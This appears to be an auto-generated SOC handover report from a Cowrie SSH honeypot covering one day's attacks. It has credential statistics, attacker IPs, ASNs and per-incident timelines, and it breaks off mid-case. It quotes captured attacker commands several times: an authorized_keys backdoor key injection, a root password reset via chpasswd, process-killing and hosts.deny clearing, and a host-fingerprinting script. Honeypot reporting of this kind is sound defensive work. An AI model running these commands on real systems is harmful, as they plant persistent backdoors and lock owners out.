# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-19 |
| **Generated At** | 2026-03-19T10:38:38Z |
| **Shift Time** | 10:38 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **281** |
| Confirmed Threats | **230** |
| False Positives Filtered | **51** (18.1%) |
| Unique Attacker IPs | **103** |
| Countries of Origin | **30** |
| High Severity Cases | **33** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **248** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **143** |
| Unique Credential Pairs | **119** |
| Unique Usernames | **82** |
| Unique Passwords | **103** |
| Successful Auth Pairs | **30** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 36 |
| `345gs5662d34` | 10 |
| `admin` | 8 |
| `ubnt` | 4 |
| `blank` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 10 |
| `3245gs5662d34` | 10 |
| `password` | 6 |
| `123456` | 5 |
| `12345678` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 10 |
| `root` | `3245gs5662d34` | 10 |
| `root` | `admin` | 3 |
| `root` | `P@ssw0rd!2025` | 3 |
| `root` | `2222` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789` | `38.250.116.128` | 2026-03-19T00:55:32 |
| `root` | `password` | `38.250.116.128` | 2026-03-19T00:56:49 |
| `root` | `admin` | `38.250.116.128` | 2026-03-19T00:57:49 |
| `root` | `12345` | `38.250.116.128` | 2026-03-19T00:58:53 |
| `root` | `Ww123456..` | `45.132.19.15` | 2026-03-19T02:30:14 |
| `root` | `qwe@123456` | `101.36.122.186` | 2026-03-19T03:21:44 |
| `root` | `3245gs5662d34` | `101.36.122.186` | 2026-03-19T03:21:47 |
| `root` | `121212` | `101.36.122.186` | 2026-03-19T03:47:04 |
| `root` | `2222` | `118.45.101.159` | 2026-03-19T04:22:18 |
| `root` | `2222` | `106.201.230.195` | 2026-03-19T04:22:25 |
| `root` | `P@ssw0rd!2025` | `61.240.156.16` | 2026-03-19T05:48:09 |
| `root` | `P@ssw0rd!2025` | `113.219.244.16` | 2026-03-19T05:48:11 |
| `root` | `3245gs5662d34` | `61.240.156.16` | 2026-03-19T05:48:13 |
| `root` | `3245gs5662d34` | `113.219.244.16` | 2026-03-19T05:48:15 |
| `root` | `wang12345` | `118.127.40.41` | 2026-03-19T05:53:29 |
| `root` | `3245gs5662d34` | `118.127.40.41` | 2026-03-19T05:53:33 |
| `root` | `pass` | `197.242.170.10` | 2026-03-19T05:58:07 |
| `root` | `P@ssw0rd!2025` | `118.127.40.41` | 2026-03-19T06:12:33 |
| `root` | `admin` | `112.163.119.199` | 2026-03-19T07:26:02 |
| `root` | `Asd123321` | `14.103.41.98` | 2026-03-19T08:05:08 |
| `root` | `P@ssword` | `112.86.146.178` | 2026-03-19T08:57:54 |
| `root` | `Password@2025` | `161.35.87.209` | 2026-03-19T09:13:15 |
| `root` | `3245gs5662d34` | `161.35.87.209` | 2026-03-19T09:13:23 |
| `root` | `!@#qwe123` | `196.29.34.170` | 2026-03-19T09:37:21 |
| `root` | `3245gs5662d34` | `196.29.34.170` | 2026-03-19T09:37:28 |
| `root` | `admin` | `116.110.18.236` | 2026-03-19T09:59:18 |
| `root` | `@` | `116.110.21.177` | 2026-03-19T10:01:46 |
| `root` | `Azerty123` | `118.193.39.127` | 2026-03-19T10:10:07 |
| `root` | `3245gs5662d34` | `118.193.39.127` | 2026-03-19T10:10:10 |
| `root` | `ABCabc123456` | `118.193.39.127` | 2026-03-19T10:12:07 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 4 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 10 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:vN2jocf5s6nH"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.103.41.98`, `45.132.19.15`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ;
```
```
uname -s -v -n -m 2 > /dev/null
```
```
uname -m 2 > /dev/null
```
```
cat /proc/uptime 2 > /dev/null | cut -d. -f1
```
Source IPs: `38.250.116.128`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.36.122.186`, `118.127.40.41`, `61.240.156.16`, `161.35.87.209`, `118.193.39.127`, `113.219.244.16`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **103** |
| Unique ASNs | **64** |
| High-Risk ASNs | **51** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4766` | Korea Telecom | 7 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 5 | HIGH |
| `AS10030` | Celcom Axiata Berhad | 4 | HIGH |
| `AS16509` | Amazon.com, Inc. | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |
| `AS46562` | Performive LLC | 3 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (33)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-bbf2956e9735

| Field | Detail |
|---|---|
| **Source IP** | `38.250.116[.]128` |
| **First Seen** | 2026-03-19 00:55 |
| **Last Seen** | 2026-03-19 00:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 00:55:30` | `cowrie.session.connect` |
| `2026-03-19 00:55:30` | `cowrie.client.version` |
| `2026-03-19 00:55:31` | `cowrie.client.kex` |
| `2026-03-19 00:55:32` | `cowrie.login.success` |
| `2026-03-19 00:55:33` | `cowrie.session.params` |
| `2026-03-19 00:55:33` | `cowrie.command.input` |
| `2026-03-19 00:55:33` | `cowrie.command.input` |
| `2026-03-19 00:55:33` | `cowrie.command.input` |
| `2026-03-19 00:55:33` | `cowrie.command.input` |
| `2026-03-19 00:55:33` | `cowrie.log.closed` |
| `2026-03-19 00:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.250.116[.]128` to AbuseIPDB if not already reported
- [ ] Block `38.250.116[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e1334e58c18

| Field | Detail |
|---|---|
| **Source IP** | `38.250.116[.]128` |
| **First Seen** | 2026-03-19 00:56 |
| **Last Seen** | 2026-03-19 00:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 00:56:47` | `cowrie.session.connect` |
| `2026-03-19 00:56:47` | `cowrie.client.version` |
| `2026-03-19 00:56:47` | `cowrie.client.kex` |
| `2026-03-19 00:56:49` | `cowrie.login.success` |
| `2026-03-19 00:56:50` | `cowrie.session.params` |
| `2026-03-19 00:56:50` | `cowrie.command.input` |
| `2026-03-19 00:56:50` | `cowrie.command.input` |
| `2026-03-19 00:56:50` | `cowrie.command.input` |
| `2026-03-19 00:56:50` | `cowrie.command.input` |
| `2026-03-19 00:56:50` | `cowrie.log.closed` |
| `2026-03-19 00:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.250.116[.]128` to AbuseIPDB if not already reported
- [ ] Block `38.250.116[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a1cd83a5336

| Field | Detail |
|---|---|
| **Source IP** | `38.250.116[.]128` |
| **First Seen** | 2026-03-19 00:57 |
| **Last Seen** | 2026-03-19 00:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 00:57:46` | `cowrie.session.connect` |
| `2026-03-19 00:57:46` | `cowrie.client.version` |
| `2026-03-19 00:57:47` | `cowrie.client.kex` |
| `2026-03-19 00:57:49` | `cowrie.login.success` |
| `2026-03-19 00:57:51` | `cowrie.session.params` |
| `2026-03-19 00:57:51` | `cowrie.command.input` |
| `2026-03-19 00:57:51` | `cowrie.command.input` |
| `2026-03-19 00:57:51` | `cowrie.command.input` |
| `2026-03-19 00:57:51` | `cowrie.command.input` |
| `2026-03-19 00:57:52` | `cowrie.log.closed` |
| `2026-03-19 00:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.250.116[.]128` to AbuseIPDB if not already reported
- [ ] Block `38.250.116[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed9ea1ca9eb

| Field | Detail |
|---|---|
| **Source IP** | `38.250.116[.]128` |
| **First Seen** | 2026-03-19 00:58 |
| **Last Seen** | 2026-03-19 00:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c "^processor" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E "model name|Hardware" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,"",$2); print $2; exit}' ; , uname -s -v -n -m 2 > /dev/null, uname -m 2 > /dev/null, cat /proc/uptime 2 > /dev/null | cut -d. -f1` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 00:58:52` | `cowrie.session.connect` |
| `2026-03-19 00:58:52` | `cowrie.client.version` |
| `2026-03-19 00:58:52` | `cowrie.client.kex` |
| `2026-03-19 00:58:53` | `cowrie.login.success` |
| `2026-03-19 00:58:54` | `cowrie.session.params` |
| `2026-03-19 00:58:54` | `cowrie.command.input` |
| `2026-03-19 00:58:54` | `cowrie.command.input` |
| `2026-03-19 00:58:54` | `cowrie.command.input` |
| `2026-03-19 00:58:54` | `cowrie.command.input` |
| `2026-03-19 00:58:54` | `cowrie.log.closed` |
| `2026-03-19 00:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.250.116[.]128` to AbuseIPDB if not already reported
- [ ] Block `38.250.116[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c2eb5a72228

| Field | Detail |
|---|---|
| **Source IP** | `45.132.19[.]15` |
| **First Seen** | 2026-03-19 02:30 |
| **Last Seen** | 2026-03-19 02:30 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vN2jocf5s6nH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 02:30:13` | `cowrie.session.connect` |
| `2026-03-19 02:30:13` | `cowrie.client.version` |
| `2026-03-19 02:30:13` | `cowrie.client.kex` |
| `2026-03-19 02:30:14` | `cowrie.login.success` |
| `2026-03-19 02:30:15` | `cowrie.session.params` |
| `2026-03-19 02:30:15` | `cowrie.command.input` |
| `2026-03-19 02:30:15` | `cowrie.command.failed` |
| `2026-03-19 02:30:15` | `cowrie.log.closed` |
| `2026-03-19 02:30:15` | `cowrie.session.params` |
| `2026-03-19 02:30:15` | `cowrie.command.input` |
| `2026-03-19 02:30:15` | `cowrie.session.file_download` |
| `2026-03-19 02:30:15` | `cowrie.log.closed` |
| `2026-03-19 02:30:24` | `cowrie.session.params` |
| `2026-03-19 02:30:24` | `cowrie.command.input` |
| `2026-03-19 02:30:24` | `cowrie.log.closed` |
| `2026-03-19 02:30:24` | `cowrie.session.params` |
| `2026-03-19 02:30:24` | `cowrie.command.input` |
| `2026-03-19 02:30:25` | `cowrie.log.closed` |
| `2026-03-19 02:30:25` | `cowrie.session.params` |
| `2026-03-19 02:30:25` | `cowrie.command.input` |
| `2026-03-19 02:30:25` | `cowrie.session.file_download` |
| `2026-03-19 02:30:25` | `cowrie.log.closed` |
| `2026-03-19 02:30:26` | `cowrie.session.params` |
| `2026-03-19 02:30:26` | `cowrie.command.input` |
| `2026-03-19 02:30:26` | `cowrie.log.closed` |
| `2026-03-19 02:30:26` | `cowrie.session.params` |
| `2026-03-19 02:30:26` | `cowrie.command.input` |
| `2026-03-19 02:30:26` | `cowrie.log.closed` |
| `2026-03-19 02:30:27` | `cowrie.session.params` |
| `2026-03-19 02:30:27` | `cowrie.command.input` |
| `2026-03-19 02:30:27` | `cowrie.command.input` |
| `2026-03-19 02:30:27` | `cowrie.log.closed` |
| `2026-03-19 02:30:27` | `cowrie.session.params` |
| `2026-03-19 02:30:27` | `cowrie.command.input` |
| `2026-03-19 02:30:27` | `cowrie.log.closed` |
| `2026-03-19 02:30:28` | `cowrie.session.params` |
| `2026-03-19 02:30:28` | `cowrie.command.input` |
| `2026-03-19 02:30:28` | `cowrie.log.closed` |
| `2026-03-19 02:30:28` | `cowrie.session.params` |
| `2026-03-19 02:30:28` | `cowrie.command.input` |
| `2026-03-19 02:30:29` | `cowrie.log.closed` |
| `2026-03-19 02:30:29` | `cowrie.session.params` |
| `2026-03-19 02:30:29` | `cowrie.command.input` |
| `2026-03-19 02:30:29` | `cowrie.log.closed` |
| `2026-03-19 02:30:30` | `cowrie.session.params` |
| `2026-03-19 02:30:30` | `cowrie.command.input` |
| `2026-03-19 02:30:30` | `cowrie.log.closed` |
| `2026-03-19 02:30:30` | `cowrie.session.params` |
| `2026-03-19 02:30:30` | `cowrie.command.input` |
| `2026-03-19 02:30:30` | `cowrie.log.closed` |
| `2026-03-19 02:30:31` | `cowrie.session.params` |
| `2026-03-19 02:30:31` | `cowrie.command.input` |
| `2026-03-19 02:30:31` | `cowrie.log.closed` |
| `2026-03-19 02:30:31` | `cowrie.session.params` |
| `2026-03-19 02:30:31` | `cowrie.command.input` |
| `2026-03-19 02:30:32` | `cowrie.log.closed` |
| `2026-03-19 02:30:32` | `cowrie.session.params` |
| `2026-03-19 02:30:32` | `cowrie.command.input` |
| `2026-03-19 02:30:32` | `cowrie.log.closed` |
| `2026-03-19 02:30:33` | `cowrie.session.params` |
| `2026-03-19 02:30:33` | `cowrie.command.input` |
| `2026-03-19 02:30:33` | `cowrie.log.closed` |
| `2026-03-19 02:30:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.132.19[.]15` to AbuseIPDB if not already reported
- [ ] Block `45.132.19[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-172a6facd3d5

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-03-19 03:21 |
| **Last Seen** | 2026-03-19 03:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 03:21:44` | `cowrie.session.connect` |
| `2026-03-19 03:21:44` | `cowrie.client.version` |
| `2026-03-19 03:21:44` | `cowrie.client.kex` |
| `2026-03-19 03:21:44` | `cowrie.login.success` |
| `2026-03-19 03:21:44` | `cowrie.session.params` |
| `2026-03-19 03:21:44` | `cowrie.command.input` |
| `2026-03-19 03:21:44` | `cowrie.command.failed` |
| `2026-03-19 03:21:45` | `cowrie.log.closed` |
| `2026-03-19 03:21:45` | `cowrie.session.params` |
| `2026-03-19 03:21:45` | `cowrie.command.input` |
| `2026-03-19 03:21:45` | `cowrie.session.file_download` |
| `2026-03-19 03:21:45` | `cowrie.log.closed` |
| `2026-03-19 03:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed423bf86420

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-03-19 03:21 |
| **Last Seen** | 2026-03-19 03:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 03:21:47` | `cowrie.session.connect` |
| `2026-03-19 03:21:47` | `cowrie.client.version` |
| `2026-03-19 03:21:47` | `cowrie.client.kex` |
| `2026-03-19 03:21:47` | `cowrie.login.success` |
| `2026-03-19 03:21:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a212929319

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-03-19 03:47 |
| **Last Seen** | 2026-03-19 03:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-19 03:47:04` | `cowrie.session.connect` |
| `2026-03-19 03:47:04` | `cowrie.client.version` |
| `2026-03-19 03:47:04` | `cowrie.client.kex` |
| `2026-03-19 03:47:04` | `cowrie.login.success` |
| `2026-03-19 03:47:05` | `cowrie.session.params` |
| `2026-03-19 03:47:05` | `cowrie.command.input` |
| `2026-03-19 03:47:05` | `cowrie.command.failed` |
| `2026-03-19 03:47:05` | `cowrie.log.closed` |
| `2026-03-19 03:47:05` | `cowrie.session.params` |
| `2026-03-19 03:47:05` | `cowrie.command.input` |
| `2026-03-19 03:47:05` | `cowrie.session.file_download` |
| `2026-03-19 03:47:05` | `cowrie.log.closed` |
| `2026-03-19 03:47:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.122[.]186` to AbuseIPDB if not already reported
- [ ] Block `101.36.122[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76053a0628f3

| Field | Detail |
|---|---|
| **Source IP** | `101.36.122[.]186` |
| **First Seen** | 2026-03-19 03:47 |
| **Last Seen** | 2026-03-19 03:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

